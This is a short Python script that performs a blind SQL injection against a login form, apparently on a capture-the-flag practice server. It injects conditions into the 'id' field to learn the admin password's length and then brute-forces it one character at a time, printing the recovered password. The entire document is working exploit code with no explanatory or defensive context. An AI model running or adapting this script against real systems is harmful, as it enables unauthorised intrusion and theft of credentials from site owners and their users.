import requests

passwordlist = []
for passlen in range(1, 50):
    req = {'id':"admin' and (SELECT length(pass) FROM user WHERE id='admin') = " + str(passlen) + "--", 'pass':''}
    r = requests.post("http://ctfq.sweetduet.info:10080/~q6/", data=req)
    if len(r.content) > 1000:
        print "The password has " + str(passlen) + " characters"
        break
for position in range(1, passlen + 1):
    for char_num in range(33, 127):
        req = {'id':"admin' and substr((SELECT pass FROM user WHERE id='admin')," + str(position) + ",1)='" + chr(char_num) + "'--", 'pass':''}
        r = requests.post("http://ctfq.sweetduet.info:10080/~q6/", data=req)
        if len(r.content) > 1000:
            print chr(char_num)
            passwordlist.append(chr(char_num))
            break

password = "".join(passwordlist)
print ""
print "The password is " + password
